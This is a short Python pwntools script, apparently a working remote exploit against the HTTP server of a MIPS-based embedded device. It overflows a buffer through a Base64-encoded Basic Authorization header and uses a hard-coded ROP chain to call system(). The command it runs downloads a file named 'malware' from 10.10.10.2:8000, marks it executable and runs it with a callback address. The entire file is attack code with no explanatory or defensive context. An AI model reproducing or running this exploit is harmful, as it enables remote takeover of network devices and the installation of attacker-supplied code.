import socket
from pwn import *
import base64
context(arch = "mips", endian = "big", os = "Linux", log_level = "DEBUG")

libc 	= 0x77f2e000 
libgcc 	= 0x77ee2000
system	= 0x0002AC90 + libc
gadgets  = [0 ,0x00008B20 ,0x00020650 ,0x000017A4 ,0x0000ABD0]
MAXSZ	= 1024
cmd		= b"wget http://10.10.10.2:8000/malware ;chmod +x ./malware ;./malware 10.10.10.2 9999"

def exp():
	rop = list(map(lambda x: x + libgcc,gadgets))
	rop[2] = rop[2] - libgcc + libc
	for i in range(1,5):
		print(f"[+] rop[{i}] is {hex(rop[i])}")
	print(f"[+] system is {hex(system)}")
	print(f"cmd length i {len(cmd)}")

	payload  = b'a:%s' %(b'A' * (0x3C - 2))
	payload += p32(rop[4])					# 
	payload += p32(rop[3])					# s0
	payload += b'AAAA'						# s1 
	payload += b'CCCC' 						# s2
	payload += p32(system)					# s3
	payload += p32(rop[2])					# s4
	payload += p32(rop[1])					# ra
	payload += cmd

	header   = b'GET / HTTP/1.1\r\n'
	# header  += b'Host: 127.0.0.1:80\r\n'
	header  += b'Host: 10.10.10.1:80\r\n'
	header  += b'Authorization: Basic %s\r\n' % base64.b64encode(payload)
	header  += b'User-Agent: Real UserAgent\r\n\r\n'


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	iport = ("10.10.10.1" ,80)
	# iport = ("127.0.0.1" ,80)
	s.connect(iport)
	s.send(header)
	msg = s.recv(MAXSZ)
	print("[+] Message is %s" %(msg))
	s.close()

if __name__ == '__main__':
	exp()

